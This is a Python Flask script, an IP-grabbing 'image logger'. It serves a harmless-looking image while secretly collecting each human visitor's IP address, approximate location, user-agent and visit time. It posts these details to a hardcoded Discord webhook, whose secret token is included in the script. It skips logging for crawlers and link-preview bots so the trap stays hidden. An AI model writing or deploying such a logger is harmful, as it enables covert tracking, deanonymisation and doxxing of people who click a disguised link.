from flask import Flask, request, Response
import requests
import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1363983953614340197/Zp_wS18KN2_mJMy4p0ecqXkRYI4C5hBEWF4ySz47RcY4rkF7Nye6pufbzHv0b1BI9Igp"
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMLjbnRX_uOEdZ60l5z19uEwyazYghr46wEA&s"

def get_location(ip):
    try:
        res = requests.get(f"https://ipapi.co/{ip}/json/")
        data = res.json()
        return f"{data.get('city', 'Unknown')}, {data.get('region', '')}, {data.get('country_name', '')}"
    except:
        return "Unknown Location"

@app.route("/")
def log_and_serve():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "Unknown")
    time_now = datetime.datetime.utcnow().isoformat()

    
    bot_keywords = ["discord", "bot", "crawl", "spider", "preview", "monitor"]
    if any(bot in ua.lower() for bot in bot_keywords):
        img_response = requests.get(IMAGE_URL)
        return Response(img_response.content, content_type=img_response.headers['Content-Type'])

    
    location = get_location(ip)

    embed = {
        "content": "📸 **Image Logged**",
        "embeds": [
            {
                "title": "Horizon: crazy image logger in progress!!!",
                "color": 0x3498DB,
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": False},
                    {"name": "Location", "value": location, "inline": False},
                    {"name": "User-Agent", "value": ua, "inline": False},
                    {"name": "Time (UTC)", "value": time_now, "inline": False}
                ]
            }
        ]
    }

    try:
        requests.post(WEBHOOK_URL, json=embed)
    except Exception as e:
        print(f"[ERROR] Webhook failed: {e}")

    img_response = requests.get(IMAGE_URL)
    return Response(img_response.content, content_type=img_response.headers['Content-Type'])
